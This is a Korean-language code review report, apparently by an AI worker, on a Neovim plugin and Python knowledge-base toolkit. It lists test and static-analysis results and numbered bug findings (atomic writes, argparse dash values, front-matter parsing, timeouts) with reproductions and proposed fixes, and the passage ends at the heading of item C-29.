# work-kb nvim 브랜치 심층 분석 (claude 워커)

대상: `5solas/nvim-review-claude` = `d168f6c` (main과의 merge-base `e8995b7`). 범위는 2차 지시대로 저장소 전체다.
기준: `work-kb-build-brief-v3.md`, `docs/DECISIONS.md`. 분석만 했고 소스는 고치지 않았다.

## 요약

- 항목 57개: 높음 2, 중간 29, 낮음 26. 버그라고 쓴 항목은 모두 `review/repro/`의 재현 파일이 현재 코드에서 실패한다(추정 항목 제외).
- [정정, 1단계-2 상호 검증] 처음 집계는 높음 0, 중간 16, 낮음 41이었다. 코디네이터 기준(높음: 데이터 손실·사람 파일 침범, 중간: 잘못된 결과·복구 가능한 실패·문서/요구 불일치, 낮음: 품질·정리)으로 17개를 다시 매겼다. 바꾼 항목은 제목에 `[정정: 이전→이후]`로 표시했고 목록은 `review/CROSS-claude.md` 끝에 있다. 일부러 만들어야 하는 특이 입력(NFD·NEL·CR 전용·전각 숫자·`\r\r\n`)만 내는 문제와 발생 조건이 사실상 없는 문제(C-11)는 낮음으로 두었다.
- 가장 큰 위험은 데이터·흐름 쪽이다: 캡처가 daily를 제자리에서 덮어써 다른 프로세스가 0바이트를 읽는다(C-03), `-`로 시작하는 입력이 argparse에 막히거나 도움말을 출력하고 성공(0)으로 끝난다(C-02), 일감 하나의 403이 전체 동기화를 영구히 막는다(C-30).
- serve 상주 서버 자체는 튼튼하다(깨진 입력·8MB 입력·파이프라인·강제 종료 뒤 재기동·KB_AGENT 모두 통과). 다만 요청 시간 초과(30초)가 잠금 대기(60초)·Jira 시간 초과(30초)보다 짧아 서버를 죽이고 같은 명령을 다시 돈다(C-01).
- 회사 모드의 공개 LLM 호스트 차단은 대소문자·끝 점·userinfo·포트·IDN·환경 변수 우회 모두 막았다. IP 주소만 열려 있다(C-43).
- 테스트: 2,172개 중 실패 5개는 모두 환경 의존(작업 트리 `.venv`·`sys.executable`에 pip가 없을 때)이고, pip를 넣으면 통과한다(C-55).

## 검증 결과

명령은 저장소 루트에서 실행했다. `.venv`=Python 3.14.10, `.venv313`=3.13.18 (3.14 단일 대상으로 범위 밖) (`uv venv`로 생성, `requirements-dev.txt`+분석 도구 설치).

| 수단 | 명령 | 결과 | 요약 |
|---|---|---|---|
| 기본 테스트 3.14 | `.venv\Scripts\python -m pytest -q -p no:randomly` | 5 failed, 2165 passed, 2 skipped (560초) | 실패 5개 모두 pip 없는 `.venv` 때문(C-55). pip 설치 뒤 5개 재실행 3회 모두 통과 |
| 기본 테스트 3.13 (3.14 단일 대상으로 범위 밖) | `.venv313\Scripts\python -m pytest -q -p no:randomly` | 5 failed, 2165 passed, 2 skipped (527초) | 같은 5개, 같은 원인 |
| 병렬 | `pytest -q -n auto` (3.14) | 2170 passed, 2 skipped (91초) | 순서 의존·공유 상태 문제 없음 |
| perf / demo / packaging | `pytest -q -m perf` / `-m demo` / `-m packaging` | 1 / 5 / 3 passed | 모두 통과 |
| 커버리지 | `pytest -q --cov=scripts --cov-branch --cov-report=term-missing` | 2170 passed, 2 skipped (520초). 문장 87%, 분기 4810 중 605 놓침 | 아래 C-56 |
| cp949·PYTHONUTF8=0 | `chcp 949 && set PYTHONUTF8=0 && pytest tests/test_cli_encoding.py test_kb_dispatch test_serve test_search test_status test_daily_prepare test_link test_nvim` | 176 passed (83초) | `test_nvim.py` 포함. cp949 콘솔에서도 UTF-8 출력·한글 경로 정상. 서브에이전트도 cp949 로캘에서 명령 6개 출력 확인 |
| 안정성 | 실패 5개를 `.venv313`(pip 없음)·`.venv`(pip 있음)로 각 3회 | 3.13: 매번 같은 2개 실패(packaging) (3.14 단일 대상으로 범위 밖), 3.14+pip: 매번 5 passed | 불안정(flaky) 아님, 결정적인 환경 의존 |
| ruff 기본 | `ruff check .` | 386건 | 사용자 전역 설정 규칙(I001·UP·FURB 등) 대부분. 실제 결함은 `wikimarkup.py:146` 죽은 변수 1건(C-57) |
| ruff 확장 | `ruff check . --select E,F,W,B,S,SIM,PL,PTH,RUF,UP,ERA,BLE,TRY` | 약 10,700건 (S101 assert 4615, E501 4377, PLR2004 621 …) | B023 11건은 같은 반복 안에서 바로 쓰는 클로저라 오탐(`compile.py:1030` 등). S603/S607은 인수 목록 실행이라 안전. 실제 문제 없음 |
| mypy | `mypy scripts --ignore-missing-imports --explicit-package-bases` | 70 errors / 8 files | 대부분 `dict | None` 좁히기 잡음(설정 조회 헬퍼 반환형). 실제 결함 없음 |
| pyright | `pyright scripts` | 88 errors | 64건이 reportOptional*. 나머지도 타입 주석 불일치. 실제 결함 없음 |
| bandit | `bandit -r scripts -q` | Medium 7, Low 20, High 0 | B506 yaml.load는 `BaseLoader`(안전, `frontmatter.py:93`), B608 SQL은 FTS 테이블 이름 상수, B314 XML은 자기가 만든 storage 검증용. 키·토큰은 keyring/env 참조만 쓰고 로그는 `redact` 거침. 실제 문제 없음 |
| vulture | `vulture scripts --min-confidence 60` | 14건 | `proposals_main`·`merge_today` 등은 동적 호출(오탐). `wikimarkup.py:146 list_widths`, `lint.py:419-420`, `lint.py:1059 SECTION_ORDER`, `schedule.py:89` 등 죽은 대입 몇 개(C-57) |
| luacheck | 임시 설정(vim 전역 허용) | nvim/ 1건, tests/nvim 5건 | `proc.lua:515` 쓰지 않는 `err`, 스펙의 죽은 대입. 무해 |
| selene | 임시 설정 | 오류 1, 경고 2 | `server.lua:188` if_same_then_else(중복 분기, 무해), `open.lua:224` mixed_table(의도) |
| lua-language-server | `lua-language-server --check nvim` | 48건 | 모두 타입 주석 잡음(need-check-nil 등) |
| PSScriptAnalyzer | `Invoke-ScriptAnalyzer -Severity Warning,Error` | install 9, uninstall 5, clip_image 0 | 빈 catch(의도적 무시), ShouldProcess 경고. `$Yes`·`$Offline` 미사용 경고는 함수 안에서 스크립트 범위로 쓰므로 오탐 |
| serve 동적 | 임시 볼트(샘플 볼트+407개 daily)에서 `kb.py serve`에 직접 요청 | 통과 | 정상 7종, 깨진 입력 9종(모두 거부·서버 생존), 미제공 명령 6종 거부, 8MB argv 1.96초, 20개 파이프라인 순서 보존, 서버 `link`와 한 번 실행 `link` 동시 실행 정상, KB_AGENT=1 서버에서 읽기 허용·쓰기 거부, `link` 도중 강제 종료 뒤 tmp·잠금 잔재 없음·재기동 정상 |
| kb.py 읽기 명령 | status, search, today, link(2회), proposals list, act list | 통과 | 두 번째 link 변경 0. 1차 link 407개 1.9초 |
| nvim 헤드리스 전체 흐름 | 서브에이전트가 임시 볼트·mock_jira·mock_llm(포트 0)으로 실행 | 통과(1건 제외) | 모든 모듈 require 성공, BOM+CRLF daily 캡처 바이트 정확, `o`(@이름·날짜·`[[KB-12]]`→sync), 검색(rg·kb.py), act list, 전환, 댓글 `--from-line`, check-done, ingest_compile(mock LLM 14회). 실패는 `read_project`(C-10) |
| mock 흐름(Jira) | sync --full → 증분 → link 2회 → act comment/transition(서버 끔/켬) → flush | 통과(항목 제외) | 증분 반영, mentions 바이트 보존, outbox 다운→pending→복구→done. 전환은 오프라인 큐 안 됨(C-31) |
| mock 흐름(B·C단계) | init --dev, doctor --redetect, ingest, compile 2회, lint --llm, push 3회, `kb.py demo` | 통과(항목 제외) | 2차 compile 0회 호출, daily 바이트 불변, push 생성→변경 없음, `--only daily/…` 거부(7), demo 9단계 성공, 가짜 PAT 유출 없음 |
| hypothesis | `pytest review/repro/hypothesis` | 31개 중 20 passed, 11 failed (99초) | 실패 11개는 모두 항목으로 올린 반례다: safe_name 81자(C-29), frontmatter `\r\r\n`·NEL(C-25·C-28), 키 정규화 유니코드 숫자(C-22), NFD `@이름`(C-23), CR만 쓰는 관리 구역(C-24). frontmatter의 `-`·`?`로 시작하는 키 반례는 도구가 고정 키만 쓰므로 항목에서 뺐다. 통과: 관리 구역 바이트 보존(LF·CRLF·`\r\r\n`·BOM·중첩·깨진 UTF-8), 이월 멱등·중복 없음(실제 볼트 300건), 검색어(NFC/NFD·대소문자·부분 문자열 5000건), 설정 병합 순서 |
| install/uninstall | 임시 LOCALAPPDATA·APPDATA·Startup·XDG·USERPROFILE + `-UserEnvFile` 이음매로 `install -Skip venv` 2회, `install -Only venv -WhatIf`, `uninstall` 2회 | 통과(C-07 제외) | 두 번 실행 안전, 제거 뒤 manifest와 `work-kb` 폴더 삭제, 사용자 환경 저장소 빈 상태. 레지스트리·실제 프로필 미사용 |
| 재현 파일 | `review/repro/C-*` 37개 | 모두 현재 코드에서 실패(종료 1) | C-11은 `$env:TZ='XXX12'`, C-16은 `$env:WHICH='upper'`로 실행. C-09_lint_compare.py는 비교용(종료 0) |

못 돌린 것:
- `pytest -m live`: 지시대로 돌리지 않았다(외부 API).
- `/code-review` 스킬(대상 main 전체): 쓰지 않았다. 같은 목적으로 영역별 서브에이전트 5개(lib·속성 검사, Phase 1–3, B·C단계, Lua, 문서)를 병렬로 돌리고, 그들이 낸 재현 파일을 내가 모두 다시 실행해 확인했다(반증 검증).
- capture.ahk: AutoHotkey가 없어 실행하지 못했다. 정적 검토만 했다.
- 실제 레지스트리(HKCU)를 쓰는 install/uninstall: 금지 사항이라 이음매(`-UserEnvFile`)로만 검증했다.

검증 중 사고 한 건: B·C단계 서브에이전트가 `tests/mock_llm.py --help`를 실행했는데 이 스크립트는 `--help`를 무시하고 기본 포트 8083에서 2분 안쪽 동안 떠 있었다. 바로 끄고 8083이 비었음을 확인했다. 그 뒤로는 모두 포트 0을 썼다.

## 항목

형식: **ID · 파일:줄 · 분류 · 심각도** — 문제 / 근거·재현 / 제안 수정 / 예상 수정 파일.
재현 실행: Python은 `.venv\Scripts\python.exe -X utf8 review/repro/<파일>`, Lua는 `pwsh -NoProfile -File review/repro/run_lua.ps1 review/repro/<파일>`(XDG를 %TEMP%로 돌림), PowerShell은 `pwsh -NoProfile -File review/repro/<파일>`. 모두 버그가 있으면 종료 1이다.

### A. 상주 서버·프로세스·캡처 (serve.py, server.lua, proc.lua, fileio.lua)

**C-01 · `nvim/lua/work-kb/server.lua:14`, `:234-242`, `proc.lua:567-581` · 정확성 · 중간**
- 문제: 요청 시간 초과(30초)가 지나면 서버를 죽이고 같은 명령을 한 번 실행으로 다시 돈다. `link`·`today`는 kb_lock을 60초까지 기다리고, `act transitions`는 Jira 시간 초과가 30초(`jira_client.py:323`), 429면 최대 60초를 기다린다. 그래서 예약 `sync`가 잠금을 쥔 동안 캡처·`t`를 누르면 30초 뒤 서버가 죽고, 다시 잠금을 기다린다. 서버는 60초 동안 다시 뜨지 않아 그동안 모든 빠른 명령이 프로세스 시작 비용을 낸다. `act transitions`는 같은 Jira 호출을 두 번 하고, 서버는 한 번에 하나만 처리하므로 그동안 검색·status가 줄을 선다. `ensure_today`는 `run_sync`(vim.wait)로 UI를 막는다.
- 근거: `C-01_server_timeout_reruns.lua`(잠금 6초, 시간 초과 2초로 축소) → `link exit=0 via=process after 5.6s; server state=dead last_error=요청 시간 초과; next status via=process`.
- 제안: 시간 초과를 "응답 없음"과 "실행 중"으로 나눈다(서버가 주기적으로 `{"id":n,"busy":true}` 하트비트를 보내거나, 시간 초과를 kb_lock 대기+여유 이상 예: 90초로). 시간 초과 때 서버를 죽이지 말고 그 요청 결과만 버리거나, 죽이더라도 한 번 실행으로 다시 돌리지 않는다(잠금 명령은 결과를 기다림). `act transitions`는 SERVED에서 빼거나 별도 시간 한도를 둔다.
- 수정 파일: `nvim/lua/work-kb/server.lua`, `nvim/lua/work-kb/proc.lua`, `scripts/serve.py`, `tests/nvim/spec/server_spec.lua`.

**C-02 · `nvim/lua/work-kb/jira.lua:472`, `:522`, `:544-545`, `:561-564`, `:610`; `search.lua:164` · 정확성 · 중간**
- 문제: 사용자가 입력한 값을 별도 인수로 넘겨서, `-`로 시작하고 공백 없는 값을 argparse가 옵션으로 읽는다. 댓글 `-긴급`, 워크로그 설명 `-리뷰`, 요약 `-긴급`, 검색어 `-foo`는 종료 4. `act assign KB-12 -hong`과 `search -hello`는 `-h…`를 도움말로 읽어 사용법을 출력하고 **종료 0** → Neovim은 "완료"라고 알린다(아무것도 안 됐는데).
- 근거: `C-02_argparse_dash_value.py` → `search query '-foo': exit 4 … unrecognized arguments`, `comment body '-긴급': exit 4 … expected one argument`. `C-02_argparse_dash_all.py` → `act comment … --body -foo -> exit 4`, `--comment -리뷰 -> exit 4`, `--summary -긴급 -> exit 4`, assign `-hong` → 도움말·종료 0.
- 제안: Lua에서 `--body=<값>`, `--comment=`, `--summary=`, `--description=`, `--jql=` 꼴로 넘기고, 위치 인수 앞에는 `--`를 넣는다(`search --root V -- <질의>`, `act assign --root V -- KEY USER`). 이 꼴은 파싱이 맞음을 확인했다.
- 수정 파일: `nvim/lua/work-kb/jira.lua`, `nvim/lua/work-kb/search.lua`, `tests/nvim/spec/jira_spec.lua`, `tests/nvim/spec/search_spec.lua`.

**C-03 · `nvim/lua/work-kb/fileio.lua:62-72`, `:531` · 정확성 · 높음 [정정: 중간→높음]**
- 문제: 캡처가 daily를 `fs_open(path, "w")`(잘라내기) 뒤 제자리에 쓴다. 쓰는 사이 다른 프로세스(예약 `link`, Obsidian, 동기화 도구)는 빈 파일이나 반쪽 파일을 읽는다. 잘라낸 뒤 쓰기 전에 Neovim이 죽거나 디스크가 차면 그날 기록 전체를 잃는다. Python 쪽은 모두 `core.atomic_write`(임시 파일+교체)다.
- 근거: `C-03_capture_nonatomic_write.lua` → `file size before=1397822 bytes; 141 captures; smallest size a concurrent reader saw=0`.
- 제안: 같은 폴더의 임시 파일에 쓰고 `uv.fs_rename`으로 교체한다(libuv는 Windows에서 MOVEFILE_REPLACE_EXISTING). 공유 위반이면 Python처럼 잠깐 다시 시도한다. 교체 직전에 디스크 바이트가 읽은 값과 같은지 한 번 더 본다.
- 수정 파일: `nvim/lua/work-kb/fileio.lua`, `tests/nvim/spec/capture_spec.lua`.

**C-04 · `nvim/lua/work-kb/server.lua:85-92` · 개선 · 낮음 (추정)**
- 문제: 서버 재사용 열쇠는 루트·Python·idle_sec·환경뿐이다. `git pull`로 `scripts/`가 바뀌어도 nvd 데몬 안의 서버는 옛 모듈로 계속 돈다(요청이 30분마다 한 번만 있어도 끝나지 않는다). 한 번 실행(새 코드)과 서버(옛 코드)의 결과가 섞인다.
- 근거: 코드 읽기. 열쇠에 코드 버전이 없다.
- 제안: 열쇠에 `scripts/` 최신 수정 시각(또는 `scripts/*.py` mtime 합)을 넣거나, 준비 줄에 코드 해시를 실어 다르면 다시 띄운다. `:WorkKb server-restart` 같은 명령도 둔다.
- 수정 파일: `nvim/lua/work-kb/server.lua`, `scripts/serve.py`.

**C-05 · `AGENTS.md:134`, `scripts/serve.py:1`, `:10`, `docs/README.md:79`, `:134` · 정확성(문서) · 중간**
- 문제: AGENTS.md는 serve가 "빠른 읽기 계열 명령만" 처리한다고 쓰지만 SERVED에는 파일을 쓰는 `today`·`link`가 있고, `act transitions`는 Jira 네트워크 호출이다. serve.py 머리말의 "빠른 로컬 명령"도 틀린다. AGENTS.md:118은 serve를 허용 목록에 두면서 :134는 에이전트가 띄울 일이 없다고 한다.
- 근거: `serve.py:41-48` SERVED, `daily_prepare.py:448`, `link.py:817`, `jira_act.py:688-691`.
- 제안: 문구를 "빠른 명령(status·search·today·link·proposals list·act list/transitions). today·link는 파일을 쓰고 act transitions는 Jira를 읽는다"로 고친다. 에이전트가 띄울 일이 없으면 `serve`를 `agent_ok=False`로 한다.
- 수정 파일: `AGENTS.md`, `scripts/serve.py`, `docs/README.md`, (선택) `scripts/kb.py`.

**C-06 · `nvim/lua/work-kb/server.lua:192-207` · 개선 · 낮음**
- 문제: 응답은 한 줄이라 큰 출력(검색 수 MB)은 64KB 조각마다 `linebuf .. data` 뒤 처음부터 `\n`을 찾는다. 길이 제곱 비용이다.
- 근거: 코드 읽기. 8MB 요청 응답은 1.96초였다(서버 측 포함).
- 제안: 조각에서만 `\n`을 찾고 조각을 표에 모아 한 번에 잇는다.
- 수정 파일: `nvim/lua/work-kb/server.lua`.

**C-07 · `uninstall.ps1:162-196`, `install.ps1:342-353` · 정확성 · 중간 [정정: 낮음→중간]**
- 문제: manifest는 `%LOCALAPPDATA%\work-kb` 하나뿐인데 uninstall은 그 값이 **이 저장소**를 가리키는지 보지 않는다. 클론 A로 설치하고 클론 B로 다시 설치한 뒤 A에서 uninstall하면 B를 가리키는 WORK_KB_ROOT를 지운다. nvim-config는 그 뒤 work-kb를 불러오지 않는다.
- 근거: `C-07_uninstall_other_clone.ps1`(이음매만 사용) → `WORK_KB_ROOT before A uninstall: …\cloneB` / `FAIL: uninstall from clone A removed the variable that points at clone B`.
- 제안: `entry.value`가 `$RepoRoot`와 같을 때만 되돌리고, 아니면 "다른 클론이 설정함, 남김"으로 보고한다. manifest의 `repo`도 항목별로 기록한다.
- 수정 파일: `uninstall.ps1`, `install.ps1`, `tests/test_install_script.py`.

**C-08 · `nvim/lua/work-kb/capture.lua:381-383` · 개선 · 낮음**
- 문제: 클립보드 임시 PNG를 볼트가 아니라 코드 루트의 `.state/tmp/`에 쓴다. 볼트를 따로 두면 코드 저장소에 쓰기가 생기고, 볼트가 다른 드라이브면 move가 복사+삭제가 된다.
- 근거: 코드 읽기.
- 제안: `<볼트>/.state/tmp/`를 쓴다(clip_image.ps1은 절대 경로 ASCII 문제가 있으면 상대 경로 계산만 바꾼다).
- 수정 파일: `nvim/lua/work-kb/capture.lua`.

### B. Neovim 플러그인 (open, jira, names, time, init, health)

**C-09 · `nvim/lua/work-kb/open.lua:358-361` · 정확성 · 중간**
- 문제: 링크 대상에 점이 있으면 확장자로 보고 `.md`를 붙여 보지 않는다. `[[Node.js]]`, 그리고 플러그인 자신이 만든 inbox 파일 `[[20261105-0912-v1.2 배포 회의]]`를 `o`로 열지 못한다. `lint.py:187`은 `[text, text+".md"]`를 둘 다 본다.
- 근거: `C-09_dotted_link.lua` → `resolve [[Node.js]] -> nil`, `open_at_point -> false 페이지가 없습니다: Node.js`. 대조: `C-09_lint_compare.py` → `['wiki/topics/Node.js.md']`.
- 제안: `.md`로 끝나지 않으면 `name`과 `name..".md"`를 둘 다 후보로 둔다(직접 경로·재귀 검색 모두).
- 수정 파일: `nvim/lua/work-kb/open.lua`, `tests/nvim/spec/open_spec.lua`.

**C-10 · `nvim/lua/work-kb/jira.lua:422-433`, `scripts/status.py:311-333` · 정확성 · 중간**
- 문제: `n`(새 일감)·`p`(승격)는 `kb.py status --json`의 `project_keys`로 후보를 만드는데, 실제 JSON에는 그 키가 없다. 후보는 늘 비고 기본값도 없다. 그런데도 매번 동기 status 호출을 기다린다. 스펙은 가짜 JSON(`jira_spec.lua:161`)에 키를 넣어 이를 가렸다. USER-GUIDE:251도 틀린다.
- 근거: `C-10_project_keys.lua` → `status --json code: 0 has project_keys: false`, `select … items: {} default: nil`.
- 제안: `status.collect`에 `"jira": {"project_keys": cfg.project_keys}`를 넣고, 실제 kb.py로 도는 통합 스펙을 하나 둔다.
- 수정 파일: `scripts/status.py`, `tests/test_status.py`, `tests/nvim/spec/jira_spec.lua`.

**C-11 · `nvim/lua/work-kb/time.lua:8-14`, `:63` · 정확성 · 낮음**
- 문제: Lua는 OS 로컬 시간대, Python은 config `timezone`(Asia/Seoul)을 쓴다. 둘이 다르면 캡처는 Lua 날짜 daily에 들어가고, `--date` 없이 부르는 `status`·`today --check-done`은 Python 날짜를 쓴다. Lua는 `KB_FAKE_NOW`도 무시한다.
- 근거: `$env:TZ='XXX12'`로 `C-11_timezone.lua` → `lua time.day(): 2026-11-14` vs `python status today: date = "2026-11-15"`.
- 제안: `--date`를 늘 넘기거나, 서버의 `status --json` `today.date`를 받아 쓴다. 최소한 DECISIONS에 "OS 시간대=config 시간대 가정"을 적는다.
- 수정 파일: `nvim/lua/work-kb/time.lua`, `nvim/lua/work-kb/jira.lua`.

**C-12 · `nvim/lua/work-kb/names.lua:157`, `:166` · 정확성 · 낮음**
- 문제: Lua `safe_name`은 ASCII 공백만 접는다. 붙여 넣은 제목의 NBSP·U+3000·U+2003·U+0085가 inbox 파일명에 남고, Python과 다른 이름이 된다. `conın$`은 Python에서만 예약 이름이다.
- 근거: `C-12_C-13_name_parity.py` → `DIFF safe_name in='회의\xa0메모' python='회의 메모' lua='회의\xa0메모'` 등 7건.
- 제안: 유니코드 공백(U+00A0, U+0085, U+1680, U+2000–200A, U+2028/9, U+202F, U+205F, U+3000)을 공백으로 접는다. Python 결과 표와 대조하는 스펙을 둔다.
- 수정 파일: `nvim/lua/work-kb/names.lua`, `tests/nvim/spec/names_spec.lua`.

**C-13 · `nvim/lua/work-kb/open.lua:100-112` · 정확성 · 낮음**
- 문제: `@이름` 글자 집합이 `notes._PERSON_CHARS`와 다르다. `o`가 찾는 페이지와 link가 만드는 페이지가 어긋난다.
- 근거: 같은 파일 → `@Nguyễn`: Python `Nguy`, Lua `Nguyễn`; `@김철수µ`: Python `김철수`, Lua `김철수µ`; `@김×철수`: Python `김×철수`, Lua `김`.
- 제안: Python과 같은 코드 포인트 범위를 Lua에 옮긴다(또는 `kb.py`에 이름 해석을 물어본다).
- 수정 파일: `nvim/lua/work-kb/open.lua`, `tests/nvim/spec/open_spec.lua`.

**C-14 · `nvim/lua/work-kb/open.lua:220-223`, `:518` · 개선 · 낮음**
- 문제: `[[jira/KB-12]]`, `[[KB-12.md]]`는 stub이어도 `sync --key` 없이 연다. `[[KB-12]]`와 `j v`만 동기화한다.
- 근거: `C-14_jira_path_link.lua` → `[[jira/KB-12]] -> … spawned kb.py: none`.
- 제안: `kind=="link"`이고 `M.link_key(value)`가 있으면 key 경로로 돌린다.
- 수정 파일: `nvim/lua/work-kb/open.lua`.

**C-15 · `nvim/lua/work-kb/jira.lua:107-117` · 정확성 · 중간 [정정: 낮음→중간]**
- 문제: `configured_dir`가 실제 경로로 풀지 않은 `cfg.root`를 쓴다. setup에 root 없이 정션 아래에서 불러오면 `t`로 연 daily에서 `p`가 "daily 파일에서만" 오류로 거부되고, `c`가 `--from-line` 대신 `--body`로 간다.
- 근거: `C-15_junction_root.ps1`(임시 정션, 끝나면 정션만 삭제) → `jira.daily_relative(daily file) -> nil (expected daily/2026-11-05.md)`.
- 제안: `init.in_vault`처럼 `pcall(config.root)`을 쓴다.
- 수정 파일: `nvim/lua/work-kb/jira.lua`.

**C-16 · `jira.lua:144`, `:173-178`, `init.lua:319-322`, `after/ftplugin/markdown.lua:46-50` · 정확성 · 낮음**
- 문제: 경로 비교의 대소문자 무시가 LuaJIT `:lower()`라 ASCII만 접는다. NTFS는 `Ö`와 `ö`를 같은 파일로 본다. `fileio.find_buffer`만 realpath로 보완한다.
- 근거: `$env:WHICH='upper'`로 `C-16_case_fold.lua` → `daily_relative(JÖRG NOTES/...) -> nil`, `vault ftplugin applied: false shiftwidth: 4`.
- 제안: 문자열 비교가 틀리면 `fs_realpath` 결과로 한 번 더 비교하는 공용 함수를 둔다.
- 수정 파일: `nvim/lua/work-kb/jira.lua`, `nvim/lua/work-kb/init.lua`, `nvim/after/ftplugin/markdown.lua`.

**C-17 · `nvim/lua/work-kb/init.lua:128-147` · 개선 · 낮음**
- 문제: 키를 뗄 때 `<leader>k…`를 지금 mapleader로 다시 펼쳐 찾으므로, mapleader를 바꾼 뒤 setup을 다시 부르면 옛 키가 남는다.
- 근거: `C-17_leader.lua` → `after prefix=false, ',kc' still mapped: true`.
- 제안: 붙일 때 `maparg(...).lhsraw`(실제 lhs)를 저장해 그것으로 뗀다.
- 수정 파일: `nvim/lua/work-kb/init.lua`.

**C-18 · `nvim/lua/work-kb/health.lua:81-90` · 개선 · 낮음**
- 문제: 처음 상태와 idle 정상 종료 뒤 상태가 모두 `stopped`인데 `:checkhealth`가 WARNING으로 보인다.
- 근거: `C-18_health.lua` → `WARNING 쓰지 못함 (stopped)`.
- 제안: `stopped`는 info("놀고 있음, 다음 요청 때 띄움")로 보인다.
- 수정 파일: `nvim/lua/work-kb/health.lua`.

### C. Python 공통 라이브러리 (notes, managed, frontmatter, config, core)

**C-19 · `scripts/lib/notes.py:114-120`, `scripts/daily_prepare.py:146-178` · 정확성 · 높음 [정정: 중간→높음]**
- 문제: 첫 줄이 `---`이고 닫는 줄이 없는 daily를 `iter_lines`가 파일 전체 front matter(코드)로 본다(`frontmatter._locate`는 front matter가 없다고 본다). `ensure_skeleton`이 `## 기록`을 못 찾아 실행할 때마다 `## 기록`을 하나씩 더 붙인다(예약 prepare·Neovim `t`가 매일 부른다). 같은 파일은 이월·link 멘션에서도 빠진다.
- 근거: `C-19_skeleton_leading_hr.py` → `'## 기록' count after each run: [2, 3, 4]`. `C-19_unclosed_frontmatter_all_code.py` → 모든 줄 `in_code=True`.
- 제안: `iter_lines`가 `frontmatter._locate(data)`로 본문 시작을 정하고 그 앞만 front matter로 본다.
- 수정 파일: `scripts/lib/notes.py`, `tests/test_notes.py`, `tests/test_daily_prepare.py`.

**C-20 · `scripts/lib/notes.py:23`, `:122-129` · 정확성 · 중간 [정정: 낮음→중간]**
- 문제: 코드 울타리를 앞 3글자만 기억한다. ```` ```` ```` 블록 안의 ```` ``` ````나 ```` ```python ```` 줄이 블록을 닫아, 코드 안의 맨 키를 `[[KB-1]]`로 바꾼다(daily를 기계가 고치는 유일한 예외에서 규칙 위반).
- 근거: `C-20_link_fence4.py` → `AssertionError: bare key inside a ```` fenced code block was normalized`.
- 제안: CommonMark처럼 여는 울타리 문자와 길이를 기억하고, 같은 문자·그 이상 길이·뒤에 다른 글자 없는 줄만 닫는다.
- 수정 파일: `scripts/lib/notes.py`, `tests/test_link.py`.

**C-21 · `scripts/lib/notes.py:147-173` · 정확성 · 중간 [정정: 낮음→중간]**
- 문제: `section_span`이 코드 울타리를 보지 않는다. `## 기록` 안 코드 블록의 `## …` 줄에서 절이 끝나 그 뒤 할 일이 이월되지 않고 키도 정규화되지 않는다.
- 근거: `C-21_heading_in_fence.py` → `task after a fenced block containing '## ' was not carried over`.
- 제안: `iter_lines`의 `in_code`를 써서 코드 안 제목을 건너뛴다.
- 수정 파일: `scripts/lib/notes.py`.

**C-22 · `scripts/lib/notes.py:211`, `scripts/link.py:42`, `scripts/daily_prepare.py:45-46` · 정확성 · 낮음**
- 문제: 키 정규식 `\d+`가 유니코드 숫자를 받는다. 한글 IME 전각 숫자 `KB-１２`가 키·stub 대상이 되고, `KB-١KB-1`은 정규화가 멱등이 아니다.
- 근거: `C-22_unicode_digits.py` → `'KB-１２ 배포 확인' -> '[[KB-１２]] …' targets: ('jira/KB-１２.md', …)`.
- 제안: `[0-9]` 또는 `re.ASCII`.
- 수정 파일: `scripts/lib/notes.py`, `scripts/link.py`, `scripts/daily_prepare.py`.

**C-23 · `scripts/lib/notes.py:50`, `:242-253` · 정확성 · 낮음**
- 문제: `find_people`가 NFD 한글(조합형 자모)을 이름으로 보지 않는다(macOS·일부 붙여 넣기).
- 근거: `C-23_people_nfd.py` → `NFC: ['김철수']  NFD: []`.
- 제안: 찾기 전에 `unicodedata.normalize("NFC", text)`.
- 수정 파일: `scripts/lib/notes.py`.

**C-24 · `scripts/lib/managed.py:58`, `scripts/lib/notes.py:29` · 정확성 · 낮음**
- 문제: CR만 쓰는 파일에서 본문이 빈 줄로 시작하면 `start-->\r\r`를 `\r\r\n`처럼 CR 덧붙임으로 읽어, 실행할 때마다 CR이 하나씩 늘어난다(멱등 위반).
- 근거: `C-24_managed_cr_only.py` → `replace_region is not idempotent on CR-only file`.
- 제안: `\r+` 뒤에 `\n`이 올 때만 CR을 덧붙임으로 보고, 아니면 각 `\r`을 줄바꿈으로 본다.
- 수정 파일: `scripts/lib/managed.py`, `scripts/lib/notes.py`, `tests/test_managed.py`.

**C-25 · `scripts/lib/frontmatter.py:17` · 정확성 · 낮음**
- 문제: 울타리 정규식 `---[ \t]*\r?`가 `\r\r\n`을 받지 않는다(managed.py는 받는다). `set_fields`가 front matter를 못 찾고 두 번째 front matter를 앞에 붙인다.
- 근거: `C-25_frontmatter_crcrlf.py` → `parse: {}`, `set_fields created a second front matter block`.
- 제안: `rb"---[ \t\r]*"`.
- 수정 파일: `scripts/lib/frontmatter.py`, `tests/test_frontmatter.py`.

**C-26 · `scripts/daily_prepare.py:149-151`, `scripts/lib/notes.py:161` · 정확성 · 중간 [정정: 낮음→중간]**
- 문제: NFD로 저장된 `## 기록` 제목을 못 알아봐 제목을 하나 더 만든다.
- 근거: `C-26_nfd_heading.py` → `AssertionError`(제목 2개, `section_span … None`).
- 제안: 제목 비교 양쪽을 NFC로.
- 수정 파일: `scripts/daily_prepare.py`, `scripts/lib/notes.py`.

**C-27 · `scripts/lib/config.py:401-410` · 정확성 · 중간 [정정: 낮음→중간]**
- 문제: 환경 변수 덮어쓰기를 `yaml.safe_load`로 읽어 `KB_CONFLUENCE_TITLE_PREFIX="[TEAM] "`이 `['TEAM']`(목록)이 되고 끝 공백도 잃는다. 게시 제목이 `['TEAM']…`로 시작한다.
- 근거: `C-27_env_override_list.py` → `parsed: ['TEAM'] -> title would start with "['TEAM']"`.
- 제안: 목록형 키(`project_keys`, `push_globs`, blocklist)만 목록으로 읽고 나머지는 문자열로 둔다. 아니면 문서에 따옴표 규칙을 적는다.
- 수정 파일: `scripts/lib/config.py`, `tests/test_config.py`.

**C-28 · `scripts/lib/frontmatter.py:80-89` · 정확성 · 낮음**
- 문제: 값에 U+0085(NEL)가 있으면 PyYAML이 작은따옴표 안에 날 글자로 쓰고, 다시 읽으면 공백이 된다.
- 근거: `C-28_frontmatter_nel.py` → `'배포\x85체크'` → `'배포 체크'`.
- 제안: `\x85`, ` `, ` `가 있으면 큰따옴표 형식으로 쓴다.
- 수정 파일: `scripts/lib/frontmatter.py`.

**C-29 · `scripts/lib/core.py:467-471` · 정확성 · 낮음**
